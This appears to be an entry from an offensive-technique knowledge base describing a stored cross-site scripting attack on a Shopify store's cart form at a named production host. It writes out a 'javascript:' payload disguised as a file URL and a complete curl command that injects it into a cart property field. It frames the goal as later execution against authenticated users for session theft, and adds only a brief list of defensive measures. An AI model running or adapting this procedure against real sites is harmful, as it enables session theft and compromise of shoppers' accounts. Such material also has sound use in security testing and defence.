---
id: proc-inject-xss-payload-001
tags:
  - xss
  - injection
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-shopify-cart-injection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:53.371Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-JavaScript-Payload-via-Cart-Form

## Summary

This procedure crafts and submits a JavaScript payload through the Shopify cart add form's custom property field, storing it server-side for later execution as stored XSS.

## Description

Target the /cart/add endpoint with a POST request including a malicious value in properties[Artwork file], such as 'javascript:alert(document.domain) //http://google.com/uploads/pwned.jpg'. The javascript: URI scheme and comment disguise it as a file reference. The payload is stored with the cart item and rendered unsanitized on cart pages, executing in the browser context. This affects authenticated users viewing the cart, enabling attacks like session theft. Requires public access; tested with id=976094353 and production-time=standard.

## Requirements

1. Access to the target endpoint
2. Curl or browser for form submission
3. Knowledge of JavaScript payloads

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all custom property inputs (e.g., using HTML entity encoding)
- Reject javascript: URIs and suspicious strings in properties
- Log and alert on payloads containing script tags or alert calls

## Objectives

1. Store JavaScript code via cart addition
2. Confirm storage without immediate execution
3. Prepare for triggering on page load

## Instructions

### Step 1: Craft the Payload

**Context**: Build the injection string to evade basic filters.

The payload is: javascript:alert(document.domain) //http://google.com/uploads/pwned.jpg

> Alert confirms domain; comment mimics a file URL.

### Step 2: Submit via Curl

**Context**: POST the form data to inject the payload.

**Command** ([[commands/curl-shopify-cart-injection]]):
```bash
curl -X POST http://hardware.shopify.com/cart/add \
  -F "id=976094353" \
  -F "properties[Artwork file]=javascript:alert(document.domain) //http://google.com/uploads/pwned.jpg" \
  -F "production-time=standard"
```

> Expected output: Success response (e.g., JSON or redirect), payload stored in cart.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-shopify-cart-injection]]

## Tools Used


## Tags

- [[xss]]
- [[injection]]
